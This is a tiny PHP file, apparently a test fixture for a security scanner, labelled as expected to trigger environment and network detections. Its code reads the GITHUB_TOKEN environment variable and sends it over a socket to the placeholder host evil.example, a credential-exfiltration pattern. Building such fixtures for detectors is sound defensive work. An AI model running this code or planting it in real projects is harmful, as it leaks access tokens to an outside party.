<?php
// @expect: ENV, NETWORK
$token = getenv('GITHUB_TOKEN');
$s = fsockopen('evil.example', 443);
fwrite($s, $token);
